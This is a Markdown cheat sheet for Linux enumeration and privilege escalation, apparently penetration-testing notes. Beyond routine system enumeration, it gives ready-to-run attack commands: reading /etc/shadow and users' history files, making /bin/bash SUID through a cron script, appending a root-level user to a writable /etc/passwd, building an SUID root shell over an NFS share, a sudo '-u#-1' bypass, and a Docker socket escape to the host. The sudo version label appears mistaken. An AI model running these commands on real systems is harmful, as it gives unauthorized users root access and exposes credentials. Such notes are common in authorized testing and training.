# Linux Enumeration and Privilege Escalation
## Enumeration
-> Get system distribution and version
```
cat /etc/*-release
```

-> Get kernel version
```
cat /proc/version   
uname -a
```

-> View variable environments 
```
env
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
cat ~/.zshrc
```

-> View user command history
```
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

-> List running processes
```
ps aux
```

-> View interfaces and network information 
```
ifconfig
ip addr
```

-> View all active TCP connections and the TCP and UDP ports the host is listening on.
```
netstat -ant
```

-> Get DNS resolver and hosts mapped to an IP
```
cat /etc/resolv.conf
cat /etc/hosts
```

-> Get system user, group and password information
```
cat /etc/passwd
cat /etc/shadow
```

### Extracting database information
#### PostgreSQL
-> psql terminal as postgres user
```
su postgres
psql
```
-> list the databases
```
\list
``` 

-> select the database
```
\c <database>
```

-> list the tables
```
\d
```

-> dump
```
select * from <table>;
```

-> read files
```
CREATE TABLE demo(t text);
COPY demo from '<filename>';
SELECT * FROM demo;
```

#### SQLite
-> access database
```
sqlite3 <database.db>
```

-> list the tables
```
.tables
```

-> dump
```
select * from <table>;
```

#### MySQL
```
mysql -u root -h localhost -p
```
-> list the databases
```
show databases;
```
-> select the database
```
use <database>;
```

-> list the tables
```
show tables;
```

-> dump
```
SELECT * FROM <table>;
```

### Other Tips
-> Perform code review on web server files (/var/www/html);
-> Check log files for credentials;

--- 

## Privilege Escalation
### Crontab [PrivEsc]
-> Enumeration  
```
cat /var/log/cron.log                                                                                                                                              
cat /etc/crontab
```

-> Exploitation  
```
echo "chmod +s /bin/bash" >> script.sh
```

### SUID [PrivEsc]
-> Enumeration 
```
find / -perm -u=s -type f 2>/dev/null
```
or  
```
id
find / -perm -u=s -type f -group <group> 2>/dev/null
```

-> Exploitation  
https://gtfobins.github.io/

### Capabilities [PrivEsc]
-> Enumeration  
```
getcap -r / 2>/dev/null
```

-> Exploitation  
https://gtfobins.github.io/

### Binary with Sudo [PrivEsc]
```
sudo -l
```
or  
```
cat /etc/sudoers
```

-> Exploitation  
https://gtfobins.github.io/

#### Run commands as another user with permission through sudo [PrivEsc]
```
sudo -u <username> <command>
```

### Weak File Permissions / Passwd Writabble [PrivEsc]
-> Enumeration  
```
ls -la /etc/passwd
ls -la /etc/shadow
```

-> Exploitation  
```
echo "user:$(openssl passwd password123):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
```

### NFS Root Squashing
-> Detection - VM Owned
``` 
cat /etc/exports
```

-> Viewing nfs directories with access - Attacker VM
```
showmount -e <ip>
```

-> Get nfs version - Attacker VM
```
rpcinfo <ip>
```

-> Mount - Attacker VM
```
mkdir /tmp/1
mount -o rw,vers=2 <ip>:/<nfs_directory> /tmp/1
```

-> Creating and compiling file for privesc - Attacker VM
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x
```

-> Exploitation - VM Owned
```
/tmp/x
id
```

### sudo < v1.28 - @sickrov [PrivEsc]
```
sudo -u#-1 /bin/bash
```

### Docker Breakout [PrivEsc]
-> Search the socket
```
find / -name docker.sock 2>/dev/null
```

-> list images  
```
docker images
```

-> Exploitation
```
docker run -it -v /:/host/ <image>:<tag> chroot /host/ bash
```

### Linux Enumeration Tools [PrivEsc]
-> Linpeas
```
./linpeas.sh
```
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

-> pspy (unprivileged Linux process snooping)  
```
./pspy64
```
https://github.com/DominicBreuker/pspy

-> linux-exploit-suggester
```
./linux-exploit-suggester.sh
```
or  
```
./linux-exploit-suiggester.sh --uname <uname-string>
```
https://github.com/The-Z-Labs/linux-exploit-suggester

-> Unix Privesc Check
```
./unix-privesc-check
```
https://pentestmonkey.net/tools/audit/unix-privesc-check
